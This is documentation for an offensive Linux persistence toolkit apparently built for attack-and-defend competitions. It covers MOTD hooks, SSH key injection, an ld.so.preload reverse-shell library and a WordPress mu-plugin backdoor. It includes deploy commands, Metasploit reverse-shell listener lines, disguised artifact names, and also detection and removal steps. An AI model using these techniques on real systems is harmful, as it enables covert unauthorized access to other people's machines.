# Red Team Persistence Toolkit

## Repository Structure

```
red-team-toolkit/
└─ tool/
   ├─ deploy.sh          # Main deployment wrapper for persistence installation
   ├─ ld_gen.sh          # Generates the malicious LD_PRELOAD shared library
   ├─ ld_install.sh      # Installs LD_PRELOAD persistence on the target
   ├─ motd_poison.sh     # Installs MOTD login-triggered persistence
   ├─ ssh_inject.sh      # Injects SSH public keys for persistent access
   ├─ wp_cron.sh         # Installs WordPress wp-cron based persistence
   ├─ obfuscate.sh       # XOR + Base64 payload obfuscation helper library
   ├─ archive/           # Deprecated / experimental persistence techniques
   │  ├─ at_callback.sh
   │  ├─ python_pth.sh
   │  └─ xdg_autostart.sh
   └─ README.md
```

## 1. Tool Overview

### What the Tool Does
This toolkit is a collection of lightweight Linux persistence utilities designed for use in attack-and-defend cybersecurity competitions. The toolkit allows a red team operator to quickly establish and maintain access on compromised Linux systems using several persistence mechanisms.

The primary entry point is `deploy.sh`, which automates deployment of persistence techniques across multiple target systems. The script transfers required toolkit components, installs persistence mechanisms, and performs cleanup operations.

Persistence mechanisms currently implemented include:

- MOTD execution persistence – executes payloads when a user logs in via SSH
- SSH key injection – adds a red team public key to authorized_keys files for persistent access
- LD_PRELOAD persistence – loads a malicious shared library into every process via `/etc/ld.so.preload`
- WordPress wp-cron persistence – injects a scheduled callback into WordPress's cron system (WordPress targets only)

The toolkit also includes a small obfuscation library used to encode payloads before writing them to system artifacts.

### Why It's Useful for Red Team
During an attack-and-defend competition, access to systems may be frequently disrupted by defensive actions such as password resets, service restarts, or host reimaging. This toolkit provides multiple persistence methods so that if one method is removed, others may remain active.

The deployment wrapper allows persistence to be rapidly redeployed across multiple hosts during competition conditions.

### Category
Persistence / Post-Exploitation Tool

### High-Level Technical Approach

1. The operator configures targets and callback parameters in `deploy.sh`.
2. The toolkit compiles a malicious shared library payload locally.
3. Files are transferred to targets using SSH/SCP.
4. Persistence methods are installed on the remote host.
5. Temporary deployment files are removed to reduce indicators.

Techniques used include:

- `/etc/update-motd.d` execution hooks
- `authorized_keys` modification
- `/etc/ld.so.preload` library injection
- WordPress wp-cron hook injection via DB and mu-plugin
- Simple payload obfuscation using XOR + Base64 encoding


---

# 2. Requirements & Dependencies

### Target Operating Systems

Linux systems (tested primarily on Debian/Ubuntu based distributions).

### Required Tools on Attacker System

- bash
- ssh
- scp
- sshpass
- gcc

Install dependencies:

```
sudo apt install sshpass gcc
```

### Required Tools on Target System

Most Linux systems already include the required components:

- bash
- python3 (optional fallback reverse shell)
- SSH service
- php CLI (required for wp_cron DB injection — typically present on WordPress hosts)

### Required Privileges

Some persistence mechanisms require elevated privileges.

| Technique | Required Privilege |
|-----------|--------------------|
| SSH key injection | User or root |
| MOTD persistence | Root |
| LD_PRELOAD persistence | Root |
| wp-cron persistence | Web server user (www-data) or root |

### Network Prerequisites

The operator machine must be reachable from targets for reverse shell callbacks.

Example listener (handles multiple simultaneous sessions):

```
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; set ExitOnSession false; run -j"
```


---

# 3. Installation Instructions

Clone the repository:

```
git clone <repo_url>
cd red-team-toolkit/tool
```

No additional installation is required.

### Configure the Deployment Script

Edit the configuration section inside:

```
deploy.sh
```

Example configuration:

```bash
TARGETS=(
    "10.10.10.101"
    "10.10.10.104:wordpress"   # :wordpress tag enables wp_cron deployment
)

TARGET_USER="target"
TARGET_PASS="targetvm"
LHOST="10.10.10.160"
LPORT="4444"
SSH_PUBKEY="ssh-ed25519 AAAA..."
```

### Verify Successful Setup

Ensure required tools exist:

```
which sshpass
which gcc
```


---

# 4. Usage Instructions

### Basic Usage

Run the deployment wrapper:

```
./deploy.sh
```

The script will:

1. Compile the shared library payload
2. Transfer toolkit files to each target
3. Install persistence mechanisms
4. Remove temporary files
5. Print a deployment summary and the listener command to run

### Example Output

```
[*] Compiling ld.so.preload shared library...
[+] Compiled libdconf-update.so

============================================================
[*] Deploying to 10.10.10.104 [wordpress]
============================================================

[*] Installing MOTD persistence...
[+] MOTD installed

[*] Injecting SSH key...
[+] SSH key injected

[*] Installing ld.so.preload persistence...
[+] Persistence Active

[*] Installing wp_cron persistence...
[+] wp_cron installed

[*] Cleanup complete

============================================================
[+] Deployment complete — Summary
============================================================
TARGET             MOTD     SSH      LD_PRELOAD   WP_CRON
------------------------------------------------------------
10.10.10.104       OK       OK       OK           OK
============================================================

[*] Start listener on 10.10.10.160 before triggering callbacks:
[*]   msfconsole -q -x "use multi/handler; ..."
```

### Advanced Usage

Operators may deploy individual persistence mechanisms manually.

Example MOTD persistence:

```
sudo LHOST=10.10.10.160 LPORT=4444 bash motd_poison.sh
```

SSH key injection:

```
SSH_PUBKEY="$(cat id_ed25519.pub)" bash ssh_inject.sh
```

Example wp-cron persistence (WordPress targets only):

```
LHOST=10.10.10.160 LPORT=4444 bash wp_cron.sh [/path/to/wp-config.php]
```

If no wp-config.php path is provided, the script will attempt to auto-discover it.

### Managing Incoming Sessions

All persistence mechanisms callback to a single LHOST. Use Metasploit's `multi/handler` to manage multiple simultaneous sessions:

```
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.160; set LPORT 4444; set ExitOnSession false; run -j"
```

Useful session management commands inside msfconsole:

```
sessions -l        # list all active sessions with source IP
sessions -i 1      # interact with session 1
Ctrl+Z             # background current session
```


---

# 5. Persistence Mechanisms

## MOTD Execution Persistence

**Script:** `motd_poison.sh`
**Required privilege:** Root

Installs a script into `/etc/update-motd.d/` that fires a reverse shell each time a user logs in via SSH. The script is named to blend in with legitimate MOTD components.

**Trigger:** SSH login by any user.

**Artifact:** `/etc/update-motd.d/98-dconf-monitor`

**Removal:**
```
sudo rm /etc/update-motd.d/98-dconf-monitor
```

---

## LD_PRELOAD Persistence

**Scripts:** `ld_gen.sh`, `ld_install.sh`
**Required privilege:** Root

Compiles a malicious shared library that spawns a reverse shell as a constructor function. The library path is added to `/etc/ld.so.preload`, causing it to be injected into every process on the system.

Rate limiting and a lock file prevent excessive callback noise.

**Trigger:** Any process execution on the target system.

**Artifacts:**
- `/etc/ld.so.preload` (modified)
- `/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99`

**Removal:**

Remove the library path from `/etc/ld.so.preload` and delete the shared library file.

---

## SSH Key Injection

**Script:** `ssh_inject.sh`
**Required privilege:** User or root

Appends a red team public key to `~/.ssh/authorized_keys` for the current user. When run as root, injects into every user's authorized_keys file including root's.

**Trigger:** Persistent SSH access — no callback required.

**Artifact:** `~/.ssh/authorized_keys` (modified)

**Removal:**

Edit `~/.ssh/authorized_keys` and remove the injected key entry.

---

## WordPress wp-cron Persistence

**Script:** `wp_cron.sh`
**Required privilege:** Web server user (www-data) or root
**Applicable targets:** WordPress installations only — tag with `:wordpress` in deploy.sh

Installs a reverse shell callback into WordPress's cron system using two co-dependent components that must both be present for the mechanism to work.

**Cron entry (DB injection):** Writes a serialized `wp_cache_gc` event into the `wp_options` table so WordPress's cron system knows the hook exists and when to fire it. Parses DB credentials automatically from `wp-config.php`. Requires php CLI on the target.

**Hook callback (mu-plugin):** Drops a PHP file into `wp-content/mu-plugins/` that registers the callback function for the `wp_cache_gc` hook. Without this the cron entry fires but nothing executes. Also self-reschedules the cron entry if it goes missing. Requires write access to the WordPress directory.

**Trigger:** Any HTTP request to the WordPress site (wp-cron fires on web traffic). Callbacks on a 5-minute schedule. Can be triggered manually:

```
curl -s http://<target>/wp-cron.php?doing_wp_cron >/dev/null
```

**Artifacts:**
- `wp_options` table rows: `cron`, `_wpcm_cb`
- `wp-content/mu-plugins/cache-manager.php`

**Removal:**
```
rm /var/www/html/wp-content/mu-plugins/cache-manager.php
mysql -u <user> -p <db> -e "DELETE FROM wp_options WHERE option_name IN ('cron','_wpcm_cb');"
```
Then restore a clean `cron` option value so WordPress reschedules its own legitimate events.


---

# 6. Operational Notes

### Competition Use

Typical workflow during an attack-and-defend event:

1. Gain initial shell access
2. Configure and run `deploy.sh`
3. Start Metasploit `multi/handler` listener
4. Maintain persistence while defenders attempt remediation
5. Redeploy if mechanisms are removed

### OpSec Considerations

Artifacts created include:

| Artifact | Location |
|----------|----------|
| MOTD script | `/etc/update-motd.d/98-dconf-monitor` |
| LD_PRELOAD entry | `/etc/ld.so.preload` |
| Shared library | `/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99` |
| SSH keys | `~/.ssh/authorized_keys` |
| wp-cron mu-plugin | `wp-content/mu-plugins/cache-manager.php` |
| wp-cron DB entries | `wp_options` table (`cron`, `_wpcm_cb`) |

Temporary deployment directory (cleaned up after each run):

```
/var/tmp/.dconf
```

These artifacts may appear in:

- authentication logs
- process logs
- system audit logs
- WordPress admin panel (Plugins > Must-Use)

### Detection Risks

Defenders may detect:

- modifications to `/etc/ld.so.preload`
- new MOTD scripts in `/etc/update-motd.d/`
- new SSH keys in `authorized_keys`
- unusual outbound connections on port 4444
- unfamiliar mu-plugin in WordPress admin


---

# 7. Limitations

### Functional Limitations

- Requires valid SSH credentials to deploy
- Some persistence methods require root privileges
- Reverse shells rely on outbound network connectivity
- wp_cron requires WordPress to be installed and receiving HTTP traffic

### Known Issues

- LD_PRELOAD persistence may cause instability on incompatible systems
- Systems without `/etc/update-motd.d` cannot use the MOTD persistence method
- wp_cron DB injection requires php CLI to be available on the target
- Reverse shell rate limiting may delay callbacks


---

# Archive Directory

The repository contains an `archive/` directory that stores older persistence experiments and alternative techniques. These scripts were developed during earlier iterations of the toolkit but are **not currently used in competition operations**.

They are retained for reference and potential future development but are **not part of the active deployment process and are intentionally excluded from the usage instructions in this document**.